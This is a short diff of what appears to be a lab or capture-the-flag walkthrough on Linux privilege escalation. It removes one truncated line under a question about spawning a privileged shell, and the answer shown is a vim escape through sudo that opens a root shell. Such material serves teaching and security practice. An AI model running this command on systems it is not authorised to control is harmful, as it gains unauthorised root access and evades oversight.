@@ -123,7 +123,6 @@ sudo -l
 
 ## 12. Command to Spawn Privileged Shell
 **Question:** What command do you use to spawn a privileged shell?  
-**Method:** After running the :
 **Command:**
 ```bash
 sudo vim -c ':!/bin/sh'
